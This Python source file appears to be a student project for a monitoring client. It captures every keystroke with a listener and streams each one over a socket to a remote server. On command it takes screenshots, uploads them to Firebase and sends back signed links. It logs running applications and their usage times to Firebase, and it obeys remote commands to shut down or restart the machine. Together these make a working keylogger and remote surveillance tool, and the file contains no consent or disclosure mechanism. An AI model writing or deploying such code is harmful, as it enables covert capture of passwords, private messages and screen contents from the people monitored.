import sqlite3
import threading
from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime
import time
import os
import psutil
import firebase_admin
from firebase_admin import credentials, storage, db

cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {
    "storageBucket": "pbl4-09092003.appspot.com",
    "databaseURL": "https://pbl4-09092003-default-rtdb.firebaseio.com"
    })
ref = db.reference('app_history')


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverParent = '192.168.1.5'
serverPort = 8080


try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def on_press(key):
    try:
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = "screenshot-" + now.strftime("%Y%m%d-%H%M%S") + ".png"
    print("Name Screen: ", nameScreen)
    try:
        screenshot = pyautogui.screenshot()
        if screenshot:
            print("successfully taken screenshot")
        else:
            print("Failed to take screenshot")
        screenshot.save(nameScreen)
        
        # Lưu ảnh vào Firebase Storage
        bucket = storage.bucket()
        
        destination = 'images/' + nameScreen
        blob = bucket.blob(destination)
        blob.upload_from_filename(nameScreen)
        
        # Gửi link ảnh public  đến server
        # link = blob.public_url
        link = blob.generate_signed_url(expiration= int(time.time()) + 3600) 
        print("Link: ",  link)
        clientSocket.send(link.encode('utf-8'))
        


    except Exception as e:
        print("Error: " + str(e))

def getAppHistory():
    
    # Danh sách lưu trữ các ứng dụng hiện tại và thời điểm mở
    current_apps = {}

    # Lặp vô hạn
    while True:
        # Lấy danh sách các ứng dụng đang chạy
        running_apps = {process.name(): int(time.time()) for process in psutil.process_iter() if process.name().endswith('.exe')}
        
        # Tìm các ứng dụng mới xuất hiện và tính toán thời gian mở
        new_apps = {app: timestamp for app, timestamp in running_apps.items() if app not in current_apps}
        
        # Tìm các ứng dụng bị đóng lại và tính toán thời gian sử dụng
        for app in current_apps:
            if app not in running_apps:
                close_time = int(time.time())
                start_time = current_apps[app]['start-time']
                usage_time = close_time - start_time
                print(f"Closed App: {app}, Usage Time: {usage_time} seconds")
                
                # Cập nhật thời gian mở, đóng và thời gian sử dụng vào Firebase
                current_date = time.strftime('%Y-%m-%d')
                date_ref = ref.child(current_date)
                app_ref = date_ref.child('app_history').push()
                app_ref.update({'app_name': app, 'start-time': start_time, 'end-time': close_time, 'usage-time': usage_time})
        
        # Cập nhật danh sách các ứng dụng hiện tại và thời điểm mở
        current_apps = {app: {'start-time': timestamp} for app, timestamp in running_apps.items()}
        
        # Đẩy dữ liệu vào Firebase với ngày hiện tại
        current_date = time.strftime('%Y-%m-%d')
        date_ref = ref.child(current_date)
        
        # Ghi dữ liệu vào Firebase
        for app, timestamp in new_apps.items():
            app_ref = date_ref.child('app_history').push()
            app_ref.update({'app_name': app, 'start-time': timestamp})
        
        # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
        time.sleep(1)


           
with Listener(on_press=on_press) as parent:
    try:
        appHistory_thread = threading.Thread(target=getAppHistory)
        appHistory_thread.start()
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'takeScreenshot':
                takeScreenshot()
            # elif message == 'appHistory':
                # getAppHistory()
            # elif message == 'webHistory':
                # get_edge_history()    
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")

    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()
        